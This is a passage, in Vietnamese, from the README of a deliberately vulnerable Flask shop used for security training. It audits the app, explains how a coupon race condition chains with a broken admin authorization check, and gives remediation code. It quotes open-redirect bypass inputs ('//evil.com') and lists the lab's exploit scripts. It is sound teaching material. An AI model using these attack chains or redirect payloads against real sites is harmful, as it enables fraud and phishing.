- Endpoint bị lỗi (`GET /api/admin/coupon`) không được liên kết ở bất
  kỳ đâu trên giao diện cho user thường (không có nút bấm nào dẫn tới
  nó) nên scanner crawl theo link cũng sẽ không tự tìm ra — phải biết
  tên endpoint trước (qua đọc JS tĩnh hoặc đoán theo quy ước đặt tên
  REST), đúng như quy trình ở mục 4b.
- Quan trọng hơn: scanner cũng sẽ không tự nhận ra **giá trị rò rỉ ra
  từ lỗ hổng này (`code`) lại chính là input cần thiết để khai thác lỗ
  hổng khác (race condition ở mục 2a)**. Việc nối hai lỗ hổng độc lập
  thành một chuỗi tấn công có ý nghĩa đòi hỏi tư duy của người kiểm
  thử, không phải thứ scanner tự động nào tính đến.

## 5b. Audit bảo mật toàn bộ ứng dụng (ghi nhận lịch sử)

> Audit dưới đây được thực hiện **trước khi** lỗ hổng #2 (vượt quyền,
> mục 2b) được chủ đích thêm vào lab. Tại thời điểm audit, mục tiêu là
> xác nhận lab **chỉ có 1 lỗ hổng** (race condition) — kết quả vẫn còn
> giá trị tham khảo cho toàn bộ phần code **không liên quan khu vực
> `/admin`**: các mục được đánh dấu AN TOÀN bên dưới không bị ảnh hưởng
> bởi những thay đổi sau này. Khu vực `/admin` (được thêm sau, chứa lỗ
> hổng #2 có chủ đích) có audit riêng ở mục 2b.

Đã rà soát lại toàn bộ `app.py` và toàn bộ template (`templates/`) theo
các nhóm lỗi phổ biến: SQL injection, XSS/SSTI, IDOR/BOLA, CSRF, mass
assignment / thao túng giá, auth bypass, open redirect, information
disclosure, path traversal, rate limiting. Kết quả:

**Các mục đã kiểm tra và xác nhận AN TOÀN** (không phải lỗ hổng mới):

- **SQL injection**: toàn bộ query dùng placeholder `?` (parameterized),
  kể cả câu `LIKE` ở ô tìm kiếm trang chủ — phần nối chuỗi f-string chỉ
  ghép các mệnh đề `WHERE` *tĩnh* (không chứa dữ liệu người dùng), dữ
  liệu luôn đi qua `params`/placeholder.
- **XSS**: không có `|safe`, `Markup(...)`, hay `render_template_string`
  nào trong code; Jinja2 autoescape mặc định bật, nên review/comment,
  tên sản phẩm, địa chỉ giao hàng, flash message... đều được escape khi
  render.
- **IDOR**: `orders/<id>` kiểm tra `order_row["user_id"] != current_user_id()`
  → 404; giỏ hàng/review/profile luôn thao tác trên dữ liệu của chính
  user đang đăng nhập (lấy qua session), không nhận object id của người
  khác từ client.
- **Thao túng giá**: `subtotal`, `discount`, `shipping_fee`,
  `final_price` đều được **tính lại ở server** từ dữ liệu trong DB tại
  thời điểm checkout — client không gửi được giá trị tiền nào trực
  tiếp; `payment_method` được so khớp với whitelist `PAYMENT_METHODS`.
  Con đường duy nhất để thao túng tổng tiền vẫn là race condition ở
  coupon (mục đích của lab).
- **Debug mode / thông tin rò rỉ**: `debug=False`, không bật Werkzeug
  console; thông báo lỗi đăng nhập/đăng ký không tiết lộ chi tiết nội
  bộ (stack trace, đường dẫn...).
- **File/path traversal**: không có route tự phục vụ file theo tham số
  người dùng; ảnh sản phẩm phục vụ qua cơ chế `static` mặc định của
  Flask (đã có bảo vệ path traversal sẵn), tên file ảnh dựng từ
  `product.id` lấy ra từ DB chứ không phải input thô.

**2 vấn đề PHỤ phát hiện được (không liên quan race condition) — đã SỬA
ngay trong lần cập nhật này** để đảm bảo đúng tinh thần "1 lỗ hổng duy
nhất" của lab:

1. **Open Redirect (CWE-601)** ở `GET/POST /login?next=...`: điều kiện
   cũ `next_url.startswith("/")` tưởng là an toàn nhưng bị bypass bởi
   URL dạng *protocol-relative* như `next=//evil.com` — chuỗi này VẪN
   bắt đầu bằng `/` nhưng trình duyệt lại điều hướng sang host
   `evil.com`. Đã sửa bằng hàm `is_safe_redirect_target()`, dùng
   `urllib.parse.urlparse` để đảm bảo cả `scheme` và `netloc` đều rỗng
   trước khi redirect (chặn cả `//evil.com` lẫn `/\evil.com`).
2. **Username enumeration qua timing side-channel (CWE-208)** ở
   `POST /login`: code cũ `user is None or not check_password_hash(...)`
   sẽ **bỏ qua hoàn toàn bước hash** khi username không tồn tại (do
   short-circuit của `or`), khiến phản hồi cho "username không tồn
   tại" nhanh hơn rõ rệt so với "username đúng, mật khẩu sai" — kẻ tấn
   công có thể dò được username hợp lệ bằng cách đo thời gian phản hồi.
   Đã sửa để **luôn gọi `check_password_hash`** (dùng một hash giả cố
   định, tạo một lần lúc khởi động, khi user không tồn tại), giúp thời
   gian phản hồi gần như không đổi giữa 2 trường hợp.

Cả hai đều là lỗi thật nhưng ở mức độ **phụ/harden** (không cho phép
trực tiếp đọc/sửa dữ liệu người khác hay chiếm quyền), khác hẳn về bản
chất với lỗ hổng race condition chính (CWE-367) — vốn cho phép **phá vỡ
trực tiếp logic nghiệp vụ** (coupon dùng-một-lần bị cộng dồn vô hạn lần,
dẫn đến giảm giá sai và có thể thanh toán gần như 0đ). Sau khi sửa, lab
chỉ còn đúng **một lỗ hổng có thể khai thác theo kịch bản chính** —
race condition ở coupon — các mục còn lại đều đã được đóng.

**Các điểm "harden thêm nếu triển khai thật" nhưng KHÔNG sửa trong lab**
(giữ nguyên để không làm lệch trọng tâm bài tập, và vì bản thân chúng
không phải lỗ hổng khai thác được theo đúng nghĩa trong ngữ cảnh lab
này):

- Không có CSRF token trên các form/API thay đổi trạng thái. Rủi ro
  thực tế được giảm đáng kể vì (a) mọi hành động thay đổi dữ liệu đều
  là `POST` (không có GET nào làm thay đổi trạng thái, trừ `/logout`
  — vô hại), và (b) cookie session của Flask không khai báo
  `SameSite=None`, nên trình duyệt hiện đại áp dụng mặc định
  `SameSite=Lax`, chặn cookie bị gửi kèm trong POST cross-site thông
  thường. Nếu triển khai thật, vẫn nên thêm CSRF token (vd.
  `flask-wtf`) làm lớp phòng thủ sâu (defense-in-depth).
- Không có rate limiting / khoá tài khoản sau nhiều lần đăng nhập sai
  → có thể bị brute-force mật khẩu nếu chạy thật trên Internet.
- Không có header bảo mật như `X-Frame-Options`/`Content-Security-Policy`
  → về lý thuyết có thể bị clickjacking (dẫn dụ người dùng click nhầm
  qua iframe ẩn).
- Trang đăng ký trả lỗi rõ ràng "Tên đăng nhập đã tồn tại" (409) — đây
  là UX chuẩn cho form đăng ký, nhưng cũng đồng nghĩa có thể dò được
  username đã đăng ký (register-time enumeration), khác với lỗi timing
  ở `/login` đã nêu trên.
- `app.secret_key` được random mỗi lần khởi động tiến trình (không lưu
  cố định) — không phải lỗ hổng (ngược lại, tránh hardcode secret key),
  nhưng có nghĩa là mọi session sẽ mất hiệu lực mỗi khi container
  restart — là hành vi vận hành cần biết, không phải vấn đề bảo mật.

## 6. Hướng khắc phục (remediation) — để hiểu bản chất lỗi

Lỗi gốc là thiếu tính nguyên tử. Cách sửa đúng là gộp bước kiểm tra và
ghi nhận vào **một UPDATE có điều kiện**, dựa vào `rowcount` để biết có
thực sự là request đầu tiên hay không:

```python
# Sửa đúng: UPDATE có điều kiện, kiểm tra rowcount thay vì SELECT rồi UPDATE riêng
cursor = db.execute(
    "UPDATE carts SET coupon_applied = 1, coupon_uses = coupon_uses + 1 "
    "WHERE id = ? AND coupon_applied = 0",
    (cart_id,),
)
db.commit()
if cursor.rowcount == 0:
    return jsonify({"error": "coupon already applied"}), 409
```

Cách này đảm bảo chỉ **đúng một** request trong số các request chạy
song song có thể làm thay đổi `coupon_applied` từ 0 → 1, vì SQLite
(và hầu hết RDBMS) tự khóa dòng dữ liệu trong một câu UPDATE đơn lẻ.

### Khắc phục lỗ hổng #2 (vượt quyền / BFLA)

> **Đã áp dụng cho endpoint cũ:** `POST /api/admin/orders/<id>/update-status`
> từng là endpoint bị lỗi ở phiên bản trước của lab. Lỗi đó **đã được
> sửa** — endpoint này giờ gọi đúng `require_admin()` và không còn khai
> thác được (xem mục regression test ở `scratchpad`/CI: "normal user
> POST update-status now blocked (403)"). Phần dưới đây mô tả cách sửa
> áp dụng cho endpoint hiện đang là mục tiêu của lab:
> `GET /api/admin/coupon`.

Cách sửa "đúng nhưng vẫn sai thực tế" là chỉ thêm lại dòng bị quên:

```python
@app.route("/api/admin/coupon", methods=["GET"])
def api_admin_coupon():
    auth = require_admin()   # <-- doi tu require_login() sang require_admin()
    if auth:
        return auth
    ...
```

Nhưng bài học quan trọng hơn là: **đừng dựa vào việc nhớ gọi đúng hàm ở
từng route**. Cách khắc phục triệt để hơn, tránh lặp lại kiểu lỗi "quên
một chỗ" này khi thêm endpoint mới trong tương lai (kể cả endpoint cũ
đã sửa và endpoint coupon hiện tại), là gom toàn bộ `/api/admin/*` vào
**một Blueprint riêng** và áp dụng kiểm tra quyền tại MỘT nơi duy nhất
bằng `before_request`, thay vì rải decorator/hàm kiểm tra ở từng route:

```python
from flask import Blueprint

admin_api = Blueprint("admin_api", __name__, url_prefix="/api/admin")

@admin_api.before_request
def _enforce_admin_role():
    # Chay TRUOC moi route trong blueprint nay - khong co cach nao
    # dang ky mot route /api/admin/* ma "quen" kiem tra duoc nua.
    auth = require_admin()
    if auth:
        return auth

@admin_api.route("/orders", methods=["GET"])
def list_orders(): ...

@admin_api.route("/orders/<int:order_id>/update-status", methods=["POST"])
def update_order_status(order_id): ...

@admin_api.route("/coupon", methods=["GET"])
def get_coupon(): ...

app.register_blueprint(admin_api)
```

Ngoài ra, nên bổ sung **kiểm thử tự động theo phương pháp authorization
testing**: với mỗi endpoint cần quyền admin, viết test gọi bằng (a) ẩn
danh, (b) user thường, (c) admin — khẳng định rõ ràng (a)/(b) đều bị từ
chối và chỉ (c) thành công. Nếu có endpoint nào thiếu test loại này,
đó chính là dấu hiệu nó có thể đang bị bỏ sót kiểm tra quyền. (`regress.py`
của lab đã làm đúng việc này với từng endpoint `/api/admin/*`.)

### Khắc phục chuỗi tấn công nói chung (mục 2c)

Ngoài việc sửa từng lỗ hổng riêng lẻ, điểm thiết kế đáng rút ra là: một
dữ liệu "bí mật" (mã giảm giá) không nên được coi là an toàn chỉ vì nó
"khó đoán" (sinh ngẫu nhiên) — nếu tồn tại BẤT KỲ con đường rò rỉ nào
(dù nhỏ), toàn bộ cơ chế dựa vào tính bí mật đó (ở đây là ràng buộc
nghiệp vụ "dùng một lần") đều có thể bị vòng qua. Phòng thủ theo chiều
sâu nghĩa là: ngay cả khi endpoint `/api/admin/coupon` được vá đúng
cách, cơ chế race condition ở `/api/cart/apply-coupon` **vẫn nên được
sửa độc lập** (theo cách ở đầu mục 6) — không nên để an toàn của tính
năng B phụ thuộc vào việc tính năng A không bao giờ bị lộ.

---

## 7. Cấu trúc thư mục

```
pixelmart/
├── app.py                   # Flask app (chứa lỗ hổng + comment giải thích)
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── entrypoint.sh             # reset DB mỗi lần container start
├── templates/
│   ├── base.html             # layout chung (header, nav, flash message)
│   ├── login.html
│   ├── register.html
│   ├── home.html              # trang chủ: lưới sản phẩm + tìm kiếm/lọc
│   ├── product_detail.html    # chi tiết sản phẩm + đánh giá
│   ├── cart.html               # giỏ hàng + áp mã + thanh toán
│   ├── profile.html            # thông tin cá nhân + đổi mật khẩu
│   ├── orders.html             # danh sách đơn hàng (có trạng thái)
│   ├── order_detail.html       # chi tiết 1 đơn hàng (phí ship, thanh toán, trạng thái, xác minh)
│   ├── admin_dashboard.html    # bảng điều khiển quản trị (chỉ role=admin,
│   │                             # gồm khối mã giảm giá đang hoạt động)
│   ├── admin_orders.html       # quản lý/xác minh thanh toán đơn hàng (chỉ role=admin)
│   ├── about.html, policy.html, contact.html  # trang tĩnh (trust signal)
│   ├── 404.html
│   └── 500.html
├── static/
│   ├── style.css              # toàn bộ theme giao diện (thuần CSS)
│   ├── products/               # ảnh sản phẩm sinh offline (p<id>_1/2/3.jpg)
│   └── js/
│       ├── admin-orders.js    # JS cho trang /admin/orders - CÔNG KHAI,
│       │                         # không yêu cầu đăng nhập (API bên dưới
│       │                         # đã được bảo vệ đúng cách, xem mục 2b)
│       └── admin-coupon.js    # JS cho khối mã giảm giá ở /admin - CÔNG
│                                 # KHAI, lộ ra endpoint bị lỗ hổng #2
│                                 # (xem mục 2b/2c)
└── exploit/
    ├── race_coupon.py          # khai thác lỗ hổng #1 (race condition);
    │                             # tự động leak mã qua lỗ hổng #2 nếu
    │                             # không được truyền --code (chuỗi đầy đủ)
    └── leak_admin_coupon.py    # khai thác riêng lỗ hổng #2 (vượt quyền/
                                   # BFLA ở GET /api/admin/coupon) - chỉ
                                   # dừng ở bước leak mã, không chạy race
```

**Cảnh báo:** chỉ chạy lab này trong môi trường cô lập (máy cá nhân/VM
nội bộ), không expose cổng 5000 ra Internet.
